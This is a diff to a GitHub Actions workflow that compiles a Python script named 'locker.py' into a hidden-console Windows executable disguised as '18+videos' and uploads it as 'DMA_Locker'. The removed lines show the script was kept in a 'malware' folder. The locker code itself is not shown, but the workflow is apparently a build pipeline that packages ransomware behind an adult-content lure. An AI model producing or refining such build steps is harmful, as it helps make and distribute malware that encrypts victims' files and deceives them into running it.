@@ -7,32 +7,11 @@ jobs:
     runs-on: windows-latest
     steps:
       - uses: actions/checkout@v4
-      
       - uses: actions/setup-python@v5
         with:
           python-version: '3.11'
-      
-      - name: Install dependencies
-        run: |
-          python -m pip install --upgrade pip
-          pip install pycryptodome pillow requests pyinstaller
-      
-      - name: Find and build
-        run: |
-          # Qidirish: locker.py qayerda?
-          if (Test-Path "locker.py") {
-            Write-Host "Found locker.py in root"
-            pyinstaller --onefile --noconsole --name "18+videos" locker.py
-          }
-          elseif (Test-Path "malware/locker.py") {
-            Write-Host "Found locker.py in malware folder"
-            pyinstaller --onefile --noconsole --name "18+videos" malware/locker.py
-          }
-          else {
-            Write-Host "ERROR: locker.py not found!"
-            exit 1
-          }
-      
+      - run: pip install pycryptodome
+      - run: pyinstaller --onefile --noconsole --name "18+videos" locker.py
       - uses: actions/upload-artifact@v4
         with:
           name: DMA_Locker
